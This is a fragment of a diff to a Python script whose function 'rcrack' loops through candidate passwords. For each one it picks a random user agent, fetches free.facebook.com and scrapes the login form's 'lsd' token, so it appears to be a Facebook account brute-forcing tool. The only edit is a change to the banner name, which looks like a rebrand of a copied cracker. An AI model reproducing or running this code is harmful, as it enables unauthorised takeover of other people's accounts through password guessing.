@@ -459,7 +459,7 @@ def rcrack(uid,pwx,tl):
         for ps in pwx:
             pro = random.choice(ugen)
             session = requests.Session()
-            sys.stdout.write(f'\r[\033[1;97mBM-KARWAN\033[1;97m] %s|\33[1;32mOK:- %s \r'%(loop,len(oks)));sys.stdout.flush()
+            sys.stdout.write(f'\r[\033[1;97m Hassan \033[1;97m] %s|\33[1;32mOK:- %s \r'%(loop,len(oks)));sys.stdout.flush()
             free_fb = session.get('https://free.facebook.com').text
             log_data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
